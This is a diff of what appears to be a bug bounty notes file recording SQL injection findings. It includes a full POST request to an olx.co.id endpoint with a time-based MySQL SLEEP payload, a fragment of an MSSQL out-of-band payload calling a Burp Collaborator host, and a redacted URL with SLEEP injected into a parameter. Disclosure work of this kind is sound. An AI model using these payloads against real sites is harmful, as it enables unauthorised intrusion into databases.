@@ -64,7 +64,7 @@ hello';declare @q varchar(99);set @q='\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcolla
 
 5)
 
-1) In this below request i got SQL injection vulnerability in location parameter (post method)
+5.1) In this below request i got SQL injection vulnerability in location parameter (post method)
 
 POST /ajax/buybundle/getbundle/ HTTP/1.1
 Host: www.olx.co.id
@@ -82,8 +82,14 @@ Cookie: PHPSESSID=29fehe5f8eaduvg5cudichht36; mobile2=desktop; onap=16bdd5da313x
 
 category=86&subcategory=4760&location={sql_command}
 
-2) while injecting this payload in location parameter (select*from(select(sleep(5)))a) server responds with a delay of 10 second. (screenshot attached below) which confirms the sql injection.
+5.2) while injecting this payload in location parameter (select*from(select(sleep(5)))a) server responds with a delay of 10 second. (screenshot attached below) which confirms the sql injection.
 
 Payload : (SELECT * FROM (SELECT(SLEEP(5)))a)
 back-end DBMS is MySQL
 web application technology: Apache
+
+6)
+
+https://███/hro/html/tech.cfm?Sort=SLEEP(25)&ThisType=3
+
+
